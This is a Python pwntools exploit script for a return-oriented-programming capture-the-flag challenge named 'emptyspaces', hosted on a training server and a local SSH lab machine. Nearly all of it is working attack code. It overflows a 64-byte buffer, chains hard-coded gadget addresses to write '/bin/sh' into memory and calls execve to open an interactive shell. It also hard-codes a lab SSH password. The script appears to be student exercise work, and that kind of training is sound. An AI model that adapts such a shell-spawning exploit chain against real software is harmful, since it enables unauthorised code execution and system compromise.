from pwn import *
from getpass import *
import logging
import time
#context(log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

if len(sys.argv)==1:
    #REMOTE EXPLOIT
    site = "training.jinblack.it"
    port = 4006
    c =  remote(site,port)
    process = "./emptyspaces"

else:
    script_name, debug = sys.argv

    #SSH EXPLOIT : PLEASE NOTE IT IS NOT POSSIBLE TO USE GDB.DEBUG THROUGH SSH USE GDB.ATTACH
    host = "acidburn"

    ip = "127.0.0.1"

    category = "rop"
    proc = "emptyspaces"
    #path = "/challenges/rop/ropasaurusrex/"
    path = "/challenges/"+category+"/"+proc+"/"
    #prt = int(input(" insert "+host+"'s port to connect to:"))
    prt = 3022

    #pwd = getpass("insert "+host+"'s password:")
    pwd = "0607991337"

    print("Connecting to "+host+" at "+ip+" to execute syscall")
    ssh_p = ssh(host,ip,password=pwd,port= prt)

    process = "."+path+proc

    gdbc = '''
               b *0x400be7
               b *0x400c0e
               continue
               b *0x400c14
               b *0x400416
           '''
    #c = ssh_p.process(process)
    #r= gdb.attach(c,gdbscript ='''b *0x400c14
    #
    #c = ssh_p.process(process)
    print(sys.argv)
    if ( debug == 'gdb') :
        c = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
    else:
        c = ssh_p.process(process)


main = 0x400b95
#pt1
pop_rdx_rsi = 0x44bd59
pop_rdi = 0x400696
empty_space = 0x6bc070
call_to_read = 0x4497b0
pop_rdx = 0x4497c5

#pt2
pop_rax = 0x4155a4
null_pointer = empty_space + 0x8
syscall = 0x40128c


mov_qword_rdi_rdx =0x435543

fd_space = 0x6bca00
flag_space = fd_space + 0x10

galf = 0x0067616c662f2e
mov_qword_ptr_rdx_rax = 0x4182d7


#first part : write /bin/sh to empty padding space
payload  = b"\x90"*64    #at the very start we fill the buffer
payload += b"BBBBBBBB" #RBP
payload += p64(pop_rdi)
payload += p64(empty_space)
payload += p64(pop_rdx)
payload += b"/bin/sh\x00"
payload += p64(mov_qword_rdi_rdx)# @ this point I have loaded my bin/sh into the empty space!!
payload += p64(main)
print(b"/bin/sh\x00")
print("Payload length"+str(len(payload)))
c.recvuntil("Where we used to pwn?\n")
c.sendline(payload)

stage_two  = b"\x90"*64    #at the very start we fill the buffer
stage_two += b"BBBBBBBB" #RBP
stage_two += p64(pop_rax)
stage_two += p64(0x3b)
stage_two += p64(pop_rdx_rsi)
stage_two += p64(null_pointer)
stage_two += p64(null_pointer)
stage_two += p64(pop_rdi)
stage_two += p64(empty_space)
stage_two += p64(syscall)
print("Payload length"+str(len(payload)))
c.recvuntil("Where we used to pwn?\n")
c.sendline(stage_two)

#1st step : load address of empty space @ rdi
stage_one_b  = p64(pop_rdi)
stage_one_b += p64(empty_space)
#2nd step: load /bin/sh @ rdx
stage_one_b += p64(pop_rdx)
stage_one_b += b"/bin/sh\x00"
#3rd step: load @ addr pointed by rdi the thing /bin/sh string found at rdx
stage_one_b += p64(mov_qword_rdi_rdx)
#4th step: now setup the sys_execve call, you need to fix rax, rdx and rsi, rdi is ALREADY SET
stage_one_b += p64(pop_rax)
stage_one_b += p64(0x3b)
stage_one_b += p64(pop_rdx_rsi)
stage_one_b += p64(0x0)#rdx
stage_one_b += p64(0x0)#rsi
stage_one_b += p64(syscall)


#time.sleep(0.1)
#c.send(stage_one_b)


c.interactive()
